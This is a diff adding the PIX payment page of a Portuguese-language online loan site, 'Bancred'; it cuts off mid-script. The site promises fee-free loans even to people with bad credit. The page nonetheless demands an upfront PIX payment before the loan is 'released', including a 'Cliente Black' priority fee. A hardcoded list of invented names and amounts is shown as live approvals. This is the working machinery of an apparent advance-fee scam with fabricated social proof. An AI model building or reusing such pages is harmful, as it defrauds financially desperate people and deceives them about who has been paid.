@@ -1,0 +1,955 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta name="csrf-token" content="quEgnpZlud3GxguTMTw4CxaLvKw5pPjQ5B9oHIo7">
+    <title>Empréstimo Seguro - Receba hoje via PIX</title>
+    <meta name="description" content="Empréstimo online rápido e seguro. Mesmo com nome sujo ou score baixo. 100% digital, sem taxa.">
+    <meta name="keywords" content="emprestimo, fácil, nome sujo, pix">
+    <meta name="author" content="Bancred">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#FFFFFF">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
+    <meta name="msapplication-navbutton-color" content="#FFFFFF">
+    <link rel="canonical" href="https://bancred.shop">
+    <meta property="og:image" content="https://bancred.shop/public/images/banner.jpg">
+    <meta property="og:title" content="Empréstimo Seguro - Receba hoje via PIX">
+    <meta property="og:url" content="https://bancred.shop">
+    <meta property="og:site_name" content="Empréstimo Seguro - Receba hoje via PIX">
+    <meta property="og:type" content="website">
+    <meta property="og:description" content="Empréstimo online rápido e seguro. Mesmo com nome sujo ou score baixo. 100% digital, sem taxa.">
+    <link rel="shortcut icon" href="../../../public/images/favicon-17.ico">
+    <link rel="stylesheet" href="../../../public/css/global-14.css">
+    <script>
+        window.pixelId = "6938cbd059dd67439a0a0a4d";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+</head>
+<body data-id="69370c9e1d918">
+    <div class="min-h-screen flex flex-col">
+        <header class="bg-white border-b border-border">
+            <div class="container mx-auto px-4 py-5">
+                <div class="flex justify-center">
+                    <div class="text-xl font-bold text-primary flex items-center">
+                        <div class="mr-3 relative group">
+                            <div class="w-8 h-8 border-2 border-primary rounded-full flex items-center justify-center relative overflow-hidden">
+                                <div class="w-full h-full bg-primary/10 absolute"></div>
+                                <div class="relative z-10 font-bold text-primary text-sm">$</div>
+                            </div>
+                            <div class="absolute -top-1 -right-1 w-3 h-3 bg-accent rounded-full border-2 border-white"></div>
+                        </div>
+                        Bancred
+                    </div>
+                </div>
+            </div>
+        </header>
+        <section class="py-12 h-full flex-1 bg-muted">
+            <div class="container mx-auto px-4">
+                <div class="max-w-md mx-auto">
+                    <!-- Loading State -->
+                    <div id="loadingState" class="shadcn-card rounded-2xl border bg-card border-card-border text-card-foreground mb-6 shadow-lg p-5">
+                        <div class="text-center">
+                            <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600 mx-auto mb-4"></div>
+                            <p class="text-gray-600">Carregando dados do PIX...</p>
+                        </div>
+                    </div>
+
+                    <!-- PIX Payment Card -->
+                    <div id="pixCard" class="shadcn-card rounded-2xl border bg-card border-card-border text-card-foreground mb-6 shadow-lg hidden">
+                        <div class="p-5">
+                            <div class="flex justify-between items-center mb-6">
+                                <div>
+                                    <p class="text-xs text-gray-500 mb-1" id="pixSubtitle">Pague com PIX</p>
+                                    <h1 class="text-2xl font-bold text-green-600" id="pixAmount">R$ 0,00</h1>
+                                </div>
+                                <div class="text-right">
+                                    <p class="text-xs text-gray-500">Expira em</p>
+                                    <span class="text-red-600 font-bold text-base" id="timeLeftText">15:00</span>
+                                </div>
+                            </div>
+                            <div class="bg-white border-4 border-gray-100 rounded-xl mx-auto mb-4 flex items-center justify-center overflow-hidden p-2" style="width:180px;height:180px;">
+                                <img alt="QR Code PIX" class="w-full h-full object-contain" id="qrCodeImage">
+                            </div>
+                            <div class="space-y-4 mb-6">
+                                <p class="text-sm text-gray-600">Copie o código PIX abaixo:</p>
+                                <div class="relative">
+                                    <input id="pixCode" class="flex w-full rounded-xl border border-input px-4 py-5 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 font-medium antialiased pr-4 font-mono text-xs bg-gray-50 h-11 transition-all duration-300 focus:ring-0 focus:ring-offset-0 focus:outline-none hover:bg-gray-100" style="text-rendering: optimizelegibility;" readonly="" data-testid="input-pix-code" value="">
+                                    <div class="absolute inset-0 bg-green-500/10 rounded border-2 border-green-500 items-center justify-center hidden" id="copiado">
+                                        <div class="bg-green-500 text-white px-3 py-1 rounded-full text-xs font-medium flex items-center gap-1">
+                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-3 w-3"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
+                                            Copiado!
+                                        </div>
+                                    </div>
+                                </div>
+                                <button id="copyPixBtn" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-xl text-base focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover-elevate active-elevate-2 bg-primary border-primary-border min-h-9 px-4 py-2 w-full text-white font-semibold h-11 transition-all duration-300 transform border-0 outline-none focus:ring-0 focus:ring-offset-0 scale-100 bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 shadow-lg hover:shadow-blue-200/50 hover:scale-105" data-testid="button-copy-code">
+                                    <div class="flex items-center gap-2">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-5 w-5"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
+                                        <span>Copiar Código</span>
+                                    </div>
+                                </button>
+                            </div>
+                            <div class="text-center mb-6">
+                                <div class="flex items-center justify-center gap-2 mb-2">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock h-4 w-4 text-orange-500 animate-spin" style="animation-duration: 3s;"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+                                    <p class="text-orange-600 font-medium text-sm flex items-center">
+                                        Aguardando pagamento
+                                        <span class="ml-0.5 inline-flex"><span style="animation: 1.8s infinite dotAnimation;">.</span>
+                                        <span style="animation: 1.8s 0.6s infinite dotAnimation;">.</span>
+                                        <span style="animation: 1.8s 1.2s infinite dotAnimation;">.</span>
+                                    </span>
+                                </p>
+                            </div>
+                            <p class="text-gray-500 text-xs">O PIX será reconhecido automaticamente</p>
+                        </div>
+                        <div class="space-y-4 mt-8 mb-6">
+                            <h3 class="text-sm font-semibold text-gray-700">Como pagar:</h3>
+                            <div class="space-y-3">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-smartphone h-5 w-5 text-gray-600"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"></rect><path d="M12 18h.01"></path></svg>
+                                    </div>
+                                    <div class="flex-1">
+                                        <p class="text-sm text-gray-700">Abra o app do seu banco</p>
+                                    </div>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy h-5 w-5 text-gray-600"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg>
+                                    </div>
+                                    <div class="flex-1">
+                                        <p class="text-sm text-gray-700">Selecione "PIX Copia e Cola"</p>
+                                    </div>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big h-5 w-5 text-gray-600"><path d="M21.801 10A10 10 0 1 1 17 3.335"></path><path d="m9 11 3 3L22 4"></path></svg>
+                                    </div>
+                                    <div class="flex-1">
+                                        <p class="text-sm text-gray-700">Cole o código e confirme o pagamento</p>
+                                    </div>
+                                </div>
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center flex-shrink-0">
+                                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-dollar-sign h-5 w-5 text-gray-600"><line x1="12" x2="12" y1="2" y2="22"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+                                    </div>
+                                    <div class="flex-1">
+                                        <p class="text-sm text-gray-700">Empréstimo liberado automaticamente</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Error State -->
+                    <div id="errorState" class="shadcn-card rounded-2xl border border-red-200 bg-red-50 text-card-foreground mb-6 shadow-lg p-5 hidden">
+                        <div class="text-center">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-alert-circle text-red-600 mx-auto mb-4"><circle cx="12" cy="12" r="10"></circle><line x1="12" x2="12" y1="8" y2="12"></line><line x1="12" x2="12.01" y1="16" y2="16"></line></svg>
+                            <p class="text-red-800 font-semibold mb-2" id="errorMessage">Erro ao carregar dados do PIX</p>
+                            <button onclick="window.location.href='../../checkout.html' + getTrackingParams()" class="mt-4 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700">Voltar ao Checkout</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex items-center justify-center gap-6">
+                    <img src="../../../public/images/pix-106.svg" alt="PIX" class="h-10" data-testid="img-pix-seal">
+                    <div class="h-6 w-px bg-gray-200"></div>
+                    <div class="flex items-center gap-2 text-gray-600">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-shield h-8 w-8 text-green-600"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>
+                        <div class="text-xs">
+                            <div class="font-semibold">Ambiente Seguro</div>
+                            <div class="text-gray-500">256-bit SSL</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+</div>
+<style>
+@keyframes dotAnimation {
+    0%, 20% { opacity: 0; }
+    21%, 80% { opacity: 1; }
+    81%, 100% { opacity: 0; }
+}
+</style>
+<script src="../../../public/js/jquery.min-17.js"></script>
+<script src="../../../public/js/jquery.mask.min-17.js"></script>
+<script src="../../../npm/alpinejs%403.x.x/dist/cdn.min-17.js" defer=""></script>
+<script>
+    const notifications = [
+        { name: "Cláudia J.", city: "Goiânia", amount: 17450.00, message: "Recebeu via PIX R$" },
+        { name: "Lucas O.", city: "Curitiba", amount: 19800.00, message: "Conseguiu o crédito de R$" },
+        { name: "Fernanda L.", city: "Porto Alegre", amount: 22100.00, message: "Foi aprovada e recebeu R$" },
+        { name: "Gabriel L.", city: "Manaus", amount: 15600.00, message: "Acabou de receber R$" },
+        { name: "Felipe M.", city: "Guarulhos", amount: 13800.00, message: "Conseguiu o crédito de R$" },
+        { name: "Tatiane P.", city: "Curitiba", amount: 8700.00, message: "Acabou de receber R$" },
+        { name: "Carla S.", city: "Salvador", amount: 21450.00, message: "Foi aprovada e recebeu R$" },
+        { name: "Rogério F.", city: "Belo Horizonte", amount: 9400.00, message: "Recebeu via PIX R$" },
+        { name: "Patrícia M.", city: "Fortaleza", amount: 11800.00, message: "Conseguiu o crédito de R$" },
+        { name: "André R.", city: "São Paulo", amount: 15200.00, message: "Acabou de receber R$" },
+        { name: "Vanessa C.", city: "Brasília", amount: 20500.00, message: "Foi aprovada e recebeu R$" },
+        { name: "João P.", city: "Recife", amount: 9700.00, message: "Recebeu via PIX R$" },
+    ];
+
+    let currentNotification = 0;
+    const container = document.querySelector('[data-testid="live-notification"]');
+    if (container) {
+        const nameEl = container.querySelector('h4');
+        const cityEl = container.querySelector('span');
+        const amountEl = container.querySelector('p');
+        const progressEl = container.querySelector('.bg-green-500');
+
+        function formatCurrencyNoti(value) {
+            return value.toLocaleString("pt-BR", {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2,
+            });
+        }
+
+        function showNotification() {
+            const n = notifications[currentNotification];
+
+            nameEl.textContent = n.name;
+            cityEl.textContent = `de ${n.city}`;
+            amountEl.innerHTML = `${n.message} ${formatCurrencyNoti(n.amount)}`;
+
+            container.classList.remove("translate-y-full", "opacity-0");
+            container.classList.add("translate-y-0", "opacity-100");
+
+            progressEl.style.transition = "none";
+            progressEl.style.width = "100%";
+            void progressEl.offsetWidth;
+
+            progressEl.style.transition = "width 5s linear";
+            progressEl.style.width = "0%";
+
+            setTimeout(() => {
+                container.classList.add("translate-y-full", "opacity-0");
+                container.classList.remove("translate-y-0", "opacity-100");
+            }, 5000);
+
+            currentNotification = (currentNotification + 1) % notifications.length;
+        }
+
+        setTimeout(showNotification, 5000);
+        setInterval(showNotification, 15000);
+    }
+</script>
+<script>
+// ============================================
+// CONFIGURAÇÃO E FUNÇÕES AUXILIARES
+// ============================================
+
+// Variáveis globais
+let transactionId = null;
+let pixData = null;
+let servico = "Payment EMP";
+let isBlackClient = false;
+
+// Obter transactionId da URL (pode vir como parâmetro ?id= ou na URL /pix/{id})
+function getTransactionId() {
+    // Tentar obter do parâmetro ?id= e verificar se é fluxo Cliente Black
+    const urlParams = new URLSearchParams(window.location.search);
+    const idFromParam = urlParams.get('id');
+    const blackFlag = urlParams.get('black');
+    
+    isBlackClient = blackFlag === '1' || blackFlag === 'true';
+    if (idFromParam) {
+        return idFromParam;
+    }
+    
+    // Tentar obter da URL /pix/{id}
+    const path = window.location.pathname;
+    const match = path.match(/\/pix\/([^\/]+)/);
+    return match ? match[1] : null;
+}
+
+// Função para obter parâmetros de tracking do sessionStorage (evita conflito com API PIX)
+function getTrackingParams() {
+    // Recuperar parâmetros salvos antes de entrar no payment.html
+    const savedParams = sessionStorage.getItem('trackingParams');
+    if (savedParams) {
+        // Remover parâmetros funcionais que podem ter sido salvos
+        const urlParams = new URLSearchParams(savedParams);
+        const trackingParams = new URLSearchParams();
+        
+        // Lista de parâmetros funcionais que devem ser removidos
+        const functionalParams = ['id', 'transaction_id', 'txid'];
+        
+        // Copiar apenas os parâmetros de tracking
+        for (const [key, value] of urlParams.entries()) {
+            if (!functionalParams.includes(key.toLowerCase())) {
+                trackingParams.append(key, value);
+            }
+        }
+        
+        const queryString = trackingParams.toString();
+        return queryString ? '?' + queryString : '';
+    }
+    return '';
+}
+
+// Função para obter URL da API baseada no ambiente
+function getApiUrl(endpoint) {
+    const isLocal = window.location.hostname === 'localhost' || 
+                  window.location.hostname === '127.0.0.1' ||
+                  window.location.protocol === 'file:';
+    
+    if (isLocal) {
+        const currentPath = window.location.pathname;
+        const basePath = currentPath.substring(0, currentPath.indexOf('/conta'));
+        return window.location.origin + basePath + '/consulta/' + endpoint;
+    } else {
+        // Modo produção (hospedagem tradicional) - usar caminho completo com .php
+        return window.location.origin + "/consulta/" + endpoint;
+    }
+}
+
+// Função para gerar QR Code (usando base64 da API ou serviço externo)
+function generateQRCode(pixCode, qrcodeBase64) {
+    // Se tiver QR Code em base64 da API BuckPay, usar ele
+    if (qrcodeBase64 && qrcodeBase64.trim() !== '') {
+        console.log('Usando QR Code base64 da API BuckPay');
+        return 'data:image/png;base64,' + qrcodeBase64;
+    }
+    
+    // Fallback: usar serviço externo para gerar QR Code do código PIX
+    if (!pixCode || pixCode.trim() === '') {
+        console.warn('Código PIX vazio, não é possível gerar QR Code');
+        return '';
+    }
+    
+    console.log('Gerando QR Code via serviço externo');
+    return 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(pixCode);
+}
+
+// ============================================
+// REGISTRAR PARÂMETROS DE TRACKING (SEM INTERFERIR NA API PIX)
+// ============================================
+
+// Função para registrar parâmetros de tracking sem interferir na API PIX
+function registrarTrackingParams() {
+    // Recuperar parâmetros salvos do sessionStorage
+    const savedParams = sessionStorage.getItem('trackingParams');
+    
+    if (savedParams && savedParams.length > 1) {
+        console.log('=== REGISTRANDO PARÂMETROS DE TRACKING ===');
+        console.log('Parâmetros salvos:', savedParams);
+        
+        // Criar URLSearchParams para processar os parâmetros
+        const urlParams = new URLSearchParams(savedParams);
+        
+        // Filtrar apenas parâmetros de tracking (remover funcionais)
+        const trackingParams = new URLSearchParams();
+        const functionalParams = ['id', 'transaction_id', 'txid'];
+        
+        urlParams.forEach((value, key) => {
+            if (!functionalParams.includes(key.toLowerCase())) {
+                trackingParams.append(key, value);
+            }
+        });
+        
+        if (trackingParams.toString()) {
+            // Usar History API para adicionar parâmetros temporariamente na URL
+            // Isso permite que utmify e outros scripts leiam os parâmetros
+            const currentUrl = new URL(window.location.href);
+            const originalSearch = currentUrl.search;
+            
+            // Adicionar parâmetros de tracking à URL atual (mantendo o ?id=)
+            trackingParams.forEach((value, key) => {
+                currentUrl.searchParams.set(key, value);
+            });
+            
+            // Usar replaceState para atualizar a URL sem recarregar a página
+            // Isso permite que os scripts de tracking leiam os parâmetros
+            const newUrl = currentUrl.toString();
+            window.history.replaceState({}, '', newUrl);
+            
+            console.log('✅ URL temporariamente atualizada para tracking:', newUrl);
+            
+            // Aguardar scripts de tracking processarem (utmify, etc)
+            setTimeout(() => {
+                // Restaurar URL original (apenas com ?id=)
+                const restoreUrl = new URL(window.location.href);
+                restoreUrl.search = originalSearch;
+                window.history.replaceState({}, '', restoreUrl.toString());
+                
+                console.log('✅ URL restaurada para API PIX:', restoreUrl.toString());
+            }, 500); // Tempo suficiente para scripts de tracking processarem
+            
+            // Registrar manualmente para outros trackers que podem não usar URL
+            const paramsObj = {};
+            trackingParams.forEach((value, key) => {
+                paramsObj[key] = value;
+            });
+            
+            // Registrar para Google Analytics se disponível
+            if (typeof gtag !== 'undefined') {
+                Object.keys(paramsObj).forEach(key => {
+                    if (key.startsWith('utm_')) {
+                        gtag('set', { [key]: paramsObj[key] });
+                    }
+                });
+            }
+            
+            // Registrar para Facebook Pixel se disponível
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'PageView', paramsObj);
+            }
+            
+            console.log('Parâmetros de tracking registrados:', paramsObj);
+        }
+    } else {
+        console.log('ℹ️ Nenhum parâmetro de tracking encontrado no sessionStorage');
+    }
+}
+
+// ============================================
+// CARREGAR DADOS DO PIX
+// ============================================
+
+// Aguardar DOM estar pronto e scripts de tracking carregarem
+$(document).ready(function() {
+    // Aguardar um pouco para scripts de tracking (utmify) carregarem
+    setTimeout(function() {
+        // Registrar parâmetros de tracking (antes de qualquer chamada da API PIX)
+        registrarTrackingParams();
+        
+        // Aguardar mais um pouco para garantir que os scripts processaram
+        setTimeout(function() {
+            // Agora inicializar a API PIX
+            initPaymentPage();
+        }, 300);
+    }, 200);
+});
+
+// Função separada para inicializar a página de pagamento
+function initPaymentPage() {
+    // Obter transactionId e definir como variável global
+    transactionId = getTransactionId();
+    console.log('=== INICIALIZAÇÃO PAYMENT ===');
+    console.log('Transaction ID obtido:', transactionId);
+    console.log('Fluxo Cliente Black?:', isBlackClient);
+
+    // Ajustar textos se for pagamento do Cliente Black
+    try {
+        if (isBlackClient) {
+            document.title = 'Pagamento Cliente Black - Prioridade de Saque';
+            const ogTitle = document.querySelector('meta[property="og:title"]');
+            if (ogTitle) ogTitle.setAttribute('content', 'Pagamento Cliente Black - Prioridade de Saque');
+
+            const pixSubtitleEl = document.getElementById('pixSubtitle');
+            if (pixSubtitleEl) {
+                pixSubtitleEl.textContent = 'Finalize o pagamento da sua taxa Cliente Black';
+            }
+
+            const infoText = document.querySelector('#pixCard .text-gray-500.text-xs');
+            if (infoText) {
+                infoText.textContent = 'Após o pagamento, sua transferência será imediata';
+            }
+        }
+    } catch (e) {
+        console.warn('Erro ao ajustar textos para Cliente Black:', e);
+    }
+
+    // Iniciar timer padrão
+    startTimer();
+
+    if (!transactionId) {
+        const loadingEl = document.getElementById('loadingState');
+        const errorEl = document.getElementById('errorState');
+        const errorMsgEl = document.getElementById('errorMessage');
+        
+        if (loadingEl) loadingEl.classList.add('hidden');
+        if (errorEl) errorEl.classList.remove('hidden');
+        if (errorMsgEl) errorMsgEl.textContent = 'Transaction ID não encontrado na URL';
+    } else {
+        // Carregar dados do PIX via API
+        loadPixData(transactionId);
+    }
+}
+
+async function loadPixData(id) {
+    try {
+        console.log('Carregando dados do PIX para transactionId:', id);
+        
+        // Tentar obter do sessionStorage primeiro (se foi salvo pelo checkout)
+        const storedPix = sessionStorage.getItem('pixData_' + id);
+        console.log('Buscando pixData_' + id + ' no sessionStorage...');
+        console.log('Dados encontrados:', storedPix);
+        
+        if (storedPix) {
+            try {
+                pixData = JSON.parse(storedPix);
+                console.log('Dados parseados do sessionStorage:', pixData);
+                console.log('pixCode nos dados:', pixData.pixCode);
+                console.log('qrcode nos dados:', pixData.qrcode);
+                console.log('qrcode_base64 nos dados:', pixData.qrcode_base64);
+                
+                // Garantir que temos o código PIX
+                if (!pixData.pixCode && !pixData.qrcode) {
+                    console.warn('ATENÇÃO: Dados salvos mas sem pixCode!', pixData);
+                }
+                
+                displayPixData(pixData);
+                return;
+            } catch (e) {
+                console.error('Erro ao parsear dados do sessionStorage:', e);
+            }
+        } else {
+            console.warn('Nenhum dado encontrado no sessionStorage para pixData_' + id);
+        }
+        
+        // Se não tiver no sessionStorage, tentar buscar diretamente da API
+        console.log('Tentando buscar dados da API...');
+        try {
+            const apiUrl = getApiUrl('get-pix.php?id=' + id);
+            console.log('URL da API:', apiUrl);
+            
+            // Por enquanto, não temos endpoint get-pix.php, então vamos tentar o produto como fallback
+            const produto = JSON.parse(sessionStorage.getItem('produto') || '{}');
+            if (produto && produto.price) {
+                console.warn('=== USANDO FALLBACK DO PRODUTO ===');
+                console.log('Dados do produto:', produto);
+                console.warn('ATENÇÃO: Código PIX não encontrado no sessionStorage!');
+                console.warn('Isso significa que a API não retornou o pixCode ou não foi salvo corretamente.');
+                
+                // Criar dados temporários baseados no produto (mas sem código PIX)
+                pixData = {
+                    id: id,
+                    amount: produto.price,
+                    qrcode: '', // Vazio porque não temos o código
+                    pixCode: '', // Vazio porque não temos o código
+                    expiresAt: new Date(Date.now() + 15 * 60 * 1000).toISOString(),
+                    status: 'pending'
+                };
+                
+                // Mostrar erro mas permitir que a página carregue
+                console.error('ERRO CRÍTICO: Código PIX não disponível!');
+                displayPixData(pixData);
+                return;
+            }
+        } catch (e) {
+            console.error('Erro ao processar fallback:', e);
+        }
+        
+        // Se não tiver nada, mostrar erro
+        throw new Error('Dados do PIX não encontrados. Por favor, gere um novo PIX no checkout.');
+        
+    } catch (error) {
+        console.error('Erro ao carregar dados do PIX:', error);
+        document.getElementById('loadingState').classList.add('hidden');
+        document.getElementById('errorState').classList.remove('hidden');
+        document.getElementById('errorMessage').textContent = error.message || 'Erro ao carregar dados do PIX';
+    }
+}
+
+function displayPixData(data) {
+    console.log('=== EXIBINDO DADOS DO PIX ===');
+    console.log('Dados recebidos:', data);
+    console.log('data.pixCode:', data.pixCode);
+    console.log('data.qrcode:', data.qrcode);
+    console.log('data.qrcode_base64:', data.qrcode_base64);
+    
+    // Formatar valor
+    const valor = parseFloat(data.amount || data.valor || 0);
+    const pixAmountEl = document.getElementById('pixAmount');
+    if (pixAmountEl) {
+        if (valor > 0) {
+            pixAmountEl.textContent = 'R$ ' + valor.toLocaleString('pt-BR', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+        } else {
+            // Tentar obter do produto se não tiver no data
+            try {
+                const produto = JSON.parse(sessionStorage.getItem('produto') || '{}');
+                const valorProduto = parseFloat(produto.price || 0);
+                if (valorProduto > 0) {
+                    pixAmountEl.textContent = 'R$ ' + valorProduto.toLocaleString('pt-BR', {
+                        minimumFractionDigits: 2,
+                        maximumFractionDigits: 2
+                    });
+                }
+            } catch (e) {
+                console.error('Erro ao obter valor do produto:', e);
+            }
+        }
+    }
+    
+    // Preencher código PIX (vem direto da API BuckPay)
+    const pixCode = data.pixCode || data.qrcode || '';
+    const qrcodeBase64 = data.qrcode_base64 || data.qrcode || '';
+    console.log('Código PIX encontrado:', pixCode ? 'SIM' : 'NÃO');
+    console.log('QR Code Base64 encontrado:', qrcodeBase64 ? 'SIM' : 'NÃO');
+    console.log('Valor do código:', pixCode);
+    
+    const pixCodeInput = document.getElementById('pixCode');
+    const copyBtn = document.getElementById('copyPixBtn');
+    const qrImage = document.getElementById('qrCodeImage');
+    
+    if (!pixCodeInput) {
+        console.error('Elemento pixCode não encontrado no DOM!');
+        return;
+    }
+    
+    if (pixCode && pixCode.trim() !== '') {
+        console.log('Preenchendo campo com código PIX...');
+        pixCodeInput.value = pixCode;
+        pixCodeInput.disabled = false;
+        pixCodeInput.removeAttribute('readonly'); // Garantir que não está readonly
+        
+        if (copyBtn) {
+            copyBtn.disabled = false;
+        }
+        
+        // Gerar e exibir QR Code (priorizar base64 da API BuckPay)
+        const qrUrl = generateQRCode(pixCode, qrcodeBase64);
+        console.log('URL do QR Code:', qrUrl ? 'Gerado com sucesso' : 'Não gerado');
+        
+        if (qrImage) {
+            qrImage.src = qrUrl;
+            qrImage.alt = 'QR Code PIX';
+            qrImage.onerror = function() {
+                console.error('Erro ao carregar QR Code base64, tentando fallback...');
+                // Fallback: tentar gerar via serviço externo
+                this.src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(pixCode);
+            };
+            qrImage.onload = function() {
+                console.log('QR Code carregado com sucesso!');
+            };
+        }
+        
+        console.log('Campo preenchido com sucesso!');
+        console.log('Valor atual do campo:', pixCodeInput.value);
+    } else {
+        // Se não tiver código PIX, mostrar mensagem
+        console.warn('Código PIX não disponível. Aguardando geração...');
+        pixCodeInput.value = 'Aguardando geração do código PIX...';
+        pixCodeInput.disabled = true;
+        
+        if (copyBtn) {
+            copyBtn.disabled = true;
+        }
+        if (qrImage) {
+            qrImage.alt = 'QR Code será gerado em breve';
+        }
+    }
+    
+    // Calcular tempo de expiração
+    if (data.expiresAt) {
+        try {
+            const expiresAt = new Date(data.expiresAt);
+            const now = new Date();
+            const diffSeconds = Math.floor((expiresAt - now) / 1000);
+            
+            // Se a data de expiração for válida e no futuro, usar ela
+            if (diffSeconds > 0 && diffSeconds <= 900) {
+                updateTimer(expiresAt);
+                console.log('Timer de expiração iniciado com data:', expiresAt);
+                console.log('Tempo restante:', diffSeconds, 'segundos');
+            } else {
+                // Se a data já passou ou é inválida, usar 15 minutos padrão
+                console.warn('Data de expiração inválida ou já passou. Usando 15 minutos padrão.');
+                startTimer();
+            }
+        } catch (e) {
+            console.error('Erro ao processar data de expiração:', e);
+            // Default: 15 minutos - usar timer simples
+            startTimer();
+            console.warn('Timer de expiração iniciado com default (15 min).');
+        }
+    } else {
+        // Default: 15 minutos - usar timer simples
+        startTimer();
+        console.log('Timer de expiração iniciado com default (15 min).');
+    }
+    
+    // Mostrar card e esconder loading
+    document.getElementById('loadingState').classList.add('hidden');
+    document.getElementById('pixCard').classList.remove('hidden');
+    
+    // Iniciar verificação de pagamento apenas se tiver transactionId válido
+    if (transactionId) {
+        startPaymentStatusCheck(transactionId);
+    }
+}
+
+// ============================================
+// TIMER DE EXPIRAÇÃO
+// ============================================
+
+let timeLeft = 900; // 15 minutos em segundos (900 segundos)
+let timerInterval = null;
+
+function formatTime(seconds) {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return mins + ':' + String(secs).padStart(2, '0');
+}
+
+function startTimer() {
+    // Sempre resetar para 15 minutos
+    timeLeft = 900; // 15 minutos em segundos
+    
+    const timeLeftTextEl = document.getElementById('timeLeftText');
+    if (timeLeftTextEl) {
+        // Limpar intervalo anterior se existir
+        if (timerInterval) {
+            clearInterval(timerInterval);
+            timerInterval = null;
+        }
+        
+        // Atualizar texto inicial
+        timeLeftTextEl.textContent = formatTime(timeLeft);
+        
+        // Iniciar contagem regressiva
+        timerInterval = setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                timeLeftTextEl.textContent = formatTime(timeLeft);
+            } else {
+                // Timer expirado
